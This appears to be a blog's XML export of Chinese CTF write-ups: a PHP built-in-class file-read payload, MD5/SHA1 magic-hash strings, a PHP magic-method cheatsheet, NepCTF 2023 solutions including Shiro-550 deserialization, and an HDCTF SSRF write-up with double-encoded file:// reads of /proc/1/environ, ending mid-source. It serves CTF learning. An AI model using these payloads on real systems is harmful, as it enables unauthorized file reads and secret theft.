class="string">&quot;flag来没来,如来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;class1&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;class2&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> <span class="keyword">and</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;class3&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=&quot;1&quot;&amp;b=&quot;1&quot;&amp;class1=Error&amp;class2=Error&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/08/24/%E6%88%91%E7%88%B1%E5%AD%A6ctf/"/>
      <url>/2023/08/24/%E6%88%91%E7%88%B1%E5%AD%A6ctf/</url>
      
        <content type="html"><![CDATA[<p>​</p><p>s878926199a                       &#x2F;&#x2F;原始字符串<br>0e545993274517709034328855841020  &#x2F;&#x2F;md5值<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787</p><p><a href="http://8fab19b5-2ea3-40b3-a5f3-218d688677a3.node4.buuoj.cn:81/?key1=s878926199a&key2=s214587387a&key4%5B%5D=/flag&key5=2024a">http://8fab19b5-2ea3-40b3-a5f3-218d688677a3.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s214587387a&amp;key4[]=/flag&amp;key5=2024a</a></p><p>key3[]&#x3D;aaroZmOk&amp;flag5&#x3D;’ ‘;</p><p><strong>以下值在md5加密后以0E开头：</strong></p><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a</li></ul><p><strong>以下值在sha1加密后以0E开头：</strong></p><ul><li>aaroZmOk</li><li>aaK1STfY</li><li>aaO8zKZF</li><li>aa3OFF9m</li><li>0e1290633704</li><li>10932435112</li></ul><p>双重MD5加密后0E开头：</p><ul><li>7r4lGXCH2Ksu2JNT3BYM</li><li>CbDLytmyGm2xQyaLNhWn</li><li>770hQgrBOjrcqftrlaZk</li></ul><p>__construct()当一个对象创建（new）时被调用<br>__destruct()对象被销毁时触发（程序结束前调用）<br>__call($funcName, $arguments)在对象上下文中调用不可访问的方法时触发<br>__callStatic($funcName, $arguments)在静态上下文中调用不可访问的方法时触发<br>__get($pr,$value)用于从不可访问的属性读取数据,当调用不存在的属性时，系统会自动触发对象所在类的定义好的__get方法，需要return<br>__set($pr,$value)用于将数据写入不可访问的属性,__set方法的参数有且只能是2个，一个是属性名，一个是属性要设置的值<br>__isset($pr)在不可访问的属性上调用isset()或empty()触发<br>__unset($pr)在不可访问的属性上使用unset()时触发<br>__toString()把类当作字符串使用时触发,需要return一个String<br>__invoke()当脚本尝试将对象调用为函数时触发<br>__sleep()使用serialize时触发,需要return array();<br>__wakeup()使用unserialize时触发<br><img src="/2023/08/24/%E6%88%91%E7%88%B1%E5%AD%A6ctf/image/v2-ed00ce07244a6e17948b0f713e880e82_r-1700990118619-49-1700994497396-23.jpg" alt="v2-ed00ce07244a6e17948b0f713e880e82_r"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2023--部分Wp</title>
      <link href="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="NepCTF2023–部分wp"><a href="#NepCTF2023–部分wp" class="headerlink" title="NepCTF2023–部分wp"></a>NepCTF2023–部分wp</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc:"></a>Misc:</h1><h2 id="Check-in"><a href="#Check-in" class="headerlink" title="Check in"></a>Check in</h2><p>NepCTF{H4ve_Fun_1N_This_Game}</p><h2 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h2><p>需要在原本附件里自带的py文件修改一下即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HuffmanNode</span>:</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, char, freq</span>):</span><br><span class="line">    self.char = char</span><br><span class="line">    self.freq = freq</span><br><span class="line">    self.left = <span class="literal">None</span></span><br><span class="line">    self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">    <span class="keyword">return</span> self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree</span>(<span class="params">frequencies</span>):</span><br><span class="line">  heap = [HuffmanNode(char, freq) <span class="keyword">for</span> char, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">  heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">    left = heapq.heappop(heap)</span><br><span class="line">    right = heapq.heappop(heap)</span><br><span class="line">    merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">    merged.left = left</span><br><span class="line">    merged.right = right</span><br><span class="line">    heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_codes</span>(<span class="params">node, current_code, huffman_codes</span>):</span><br><span class="line">  <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    huffman_codes[node.char] = current_code</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  build_huffman_codes(node.left, current_code + <span class="string">&#x27;0&#x27;</span>, huffman_codes)</span><br><span class="line">  build_huffman_codes(node.right, current_code + <span class="string">&#x27;1&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">  frequencies = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> byte <span class="keyword">not</span> <span class="keyword">in</span> frequencies:</span><br><span class="line">      frequencies[byte] = <span class="number">0</span></span><br><span class="line">    frequencies[byte] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  root = build_huffman_tree(frequencies)</span><br><span class="line">  huffman_codes = &#123;&#125;</span><br><span class="line">  build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line">  compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">    compressed_data += huffman_codes[byte]</span><br><span class="line"></span><br><span class="line">  padding = <span class="number">8</span> - <span class="built_in">len</span>(compressed_data) % <span class="number">8</span></span><br><span class="line">  compressed_data += <span class="string">&#x27;0&#x27;</span> * padding</span><br><span class="line"></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    \<span class="comment"># Write frequency information</span></span><br><span class="line">    f.write(<span class="built_in">bytes</span>([<span class="built_in">len</span>(frequencies)]))</span><br><span class="line">    <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items():</span><br><span class="line">      f.write(<span class="built_in">bytes</span>([byte, (freq &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, freq &amp; <span class="number">0xFF</span>]))</span><br><span class="line"></span><br><span class="line">​    \<span class="comment"># Write compressed data</span></span><br><span class="line">​    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(compressed_data), <span class="number">8</span>):</span><br><span class="line">​      byte = compressed_data[i:i+<span class="number">8</span>]</span><br><span class="line">​      f.write(<span class="built_in">bytes</span>([<span class="built_in">int</span>(byte, <span class="number">2</span>)]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree_from_bytes</span>(<span class="params">frequencies</span>):</span><br><span class="line">  heap = [HuffmanNode(byte, freq) <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">  heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">    left = heapq.heappop(heap)</span><br><span class="line">    right = heapq.heappop(heap)</span><br><span class="line">    merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">    merged.left = left</span><br><span class="line">    merged.right = right</span><br><span class="line">    heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    frequencies_count = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(frequencies_count):</span><br><span class="line">​      byte = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">​      freq = (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">24</span>) + (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">16</span>) + (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">8</span>) + <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">​      frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">​    root = build_huffman_tree_from_bytes(frequencies)</span><br><span class="line"></span><br><span class="line">​    huffman_codes = &#123;&#125;</span><br><span class="line">​    build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line">​    reverse_huffman_codes = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> huffman_codes.items()&#125;</span><br><span class="line"></span><br><span class="line">​    decompressed_data = <span class="built_in">bytearray</span>()</span><br><span class="line">​    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">​    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">​      byte = f.read(<span class="number">1</span>)</span><br><span class="line">​      <span class="keyword">if</span> <span class="built_in">len</span>(byte) == <span class="number">0</span>:</span><br><span class="line">​        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">​      byte = <span class="built_in">ord</span>(byte)</span><br><span class="line">​      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">​        <span class="keyword">if</span> byte &amp; (<span class="number">1</span> &lt;&lt; i):</span><br><span class="line">​          code += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">​        <span class="keyword">else</span>:</span><br><span class="line">​          code += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">if</span> code <span class="keyword">in</span> reverse_huffman_codes:</span><br><span class="line">​          decompressed_data.append(reverse_huffman_codes[code])</span><br><span class="line">​          code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decompressed_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  \<span class="comment"># input_file = &#x27;input.txt&#x27;</span></span><br><span class="line">  compressed_file = <span class="string">&#x27;compressed.bin&#x27;</span></span><br><span class="line">  decompressed_file = <span class="string">&#x27;decompressed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 压缩文件</span></span><br><span class="line">  \<span class="comment"># compress(input_file, compressed_file)</span></span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 解压缩文件</span></span><br><span class="line">  decompress(compressed_file, decompressed_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h2><p>下载拿到piano.bin，是个音频文件，拉进Audacity看一下，发现有频谱，通过放大缩小频谱发现有字符串，将字符串抄写下来，钱一部分是摩斯密码，后部分是16进制</p><blockquote><p>1011 111 001 000 0000 111 001 0100 100 001 000 0 1 0000 00 000 1 111 1001 111 010 000 111 11 0 1 0000 00 10 110</p></blockquote><p><strong>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</strong></p><p>对摩斯面解码发现：</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\image-20230812145240478.png"></p><p>YOUSHOULDUSETHISTOXORSOMETHING</p><p>提示应该有异或，但暂时不知道是什么，</p><p>后来试了半天与16进制转字符串异或</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\image-20230814161353554.png"></p><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **en\</span><br><span class="line">viron;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (en\</span><br><span class="line">viron[i] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, en\</span><br><span class="line">viron[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h2><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\QQ图片20230813163223.jpg"></p><p>打开图片一脸懵，发现有特殊符号，题目描述说</p><p>A同学在回学校的路上捡到了一张纸条，你能帮帮她吗？</p><p>flag格式：NepCTF{XX_XX}</p><p>hint：A同学的英文名为“Atsuko Kagari”</p><p>去搜Atsuko Kagari”，发现为小魔女学园动漫女主角，去看了动漫，发现里面有着文字，新月文字和古龙语，去上网找解释</p><p>找到</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\QQ图片20230813163230.jpg"></p><p>对应写出，按照感觉添加下划线</p><blockquote><p>NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p></blockquote><h2 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h2><p>这道题就是个游戏，就是自己和机器人下棋，你自己先先连出来42和5子棋就可得到flag，不想在复现一遍了。。。</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h2><p>题目说是一种很老的cve，题目又是java-checkin，上网搜，找到一个跟java有关得cve</p><p>shiro550反序列化漏洞</p><p>利用工具</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/image/image-20230813164252615-1700990408076-211-1700994582910-185.png" alt="image-20230813164252615"></p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/image/image-20230813164322711-1700990408076-212-1700994582910-186.png" alt="image-20230813164322711"></p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/image/image-20230813164337799-1700990408076-213-1700994582910-187.png" alt="image-20230813164337799"></p><p>得到flag</p><blockquote><p>NepcTF{Ezjava_Chekin}</p></blockquote><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="HRP-CHAT"><a href="#HRP-CHAT" class="headerlink" title="HRP-CHAT"></a>HRP-CHAT</h2><h3 id="HRP-CHAT-4"><a href="#HRP-CHAT-4" class="headerlink" title="HRP-CHAT-4"></a>HRP-CHAT-4</h3><p>当时打boss给系统打崩了就进入到了安全模式但是很懵，本来看代码相出3的，就去看了一下safebox.c,发现这里面可以吐出来4flag</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/image/image-20230814152239315-1700990408077-214-1700994582910-188.png" alt="image-20230814152239315"></p><p>输入Safe_Mode_Key即可得出flag</p><h3 id="HRP-CHAT-3"><a href="#HRP-CHAT-3" class="headerlink" title="HRP-CHAT-3"></a>HRP-CHAT-3</h3><p>看servc.c源码发现</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/image/image-20230814153345494-1700990408077-215-1700994582910-189.png" alt="image-20230814153345494"></p><p>打败bossT能够得到flag</p><h1 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h1><p>NepCTF{See_you_in_NepCTF2024} </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 赛事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDCTF 2023-YamiYami</title>
      <link href="/2023/08/24/%5BHDCTF%202023%5DYamiYami/"/>
      <url>/2023/08/24/%5BHDCTF%202023%5DYamiYami/</url>
      
        <content type="html"><![CDATA[<h1 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="HDCTF 2023 YamiYami"></a>HDCTF 2023 YamiYami</h1><p>非预期解：进入题目界面第一个点开&#x2F;read路由跳转到百度，发现有文件读取，直接file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ读取环境变量得flag</p><p>预期解：</p><p>在&#x2F;read路由尝试读app.py和flag发现被正则过滤,url二次编码app&#x2F;app.py:</p><p>这里有url二次编码可绕过过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///%25%36%31%25%37%30%25%37%30%25%32%46%25%36%31%25%37%30%25%37%30%25%32%45%25%37%30%25%37%39</span><br></pre></td></tr></table></figure><p><img src="http://raw.githubusercontent.com/qingchuana/img/main/img/image-20230923155634248.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;[/read?url=https://baidu.com](view-source:http://node2.anna.nssctf.cn:28427/read?url=https://baidu.com)&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;[/upload](view-source:http://node2.anna.nssctf.cn:28427/upload)&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;[/pwd](view-source:http://node2.anna.nssctf.cn:28427/pwd)&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    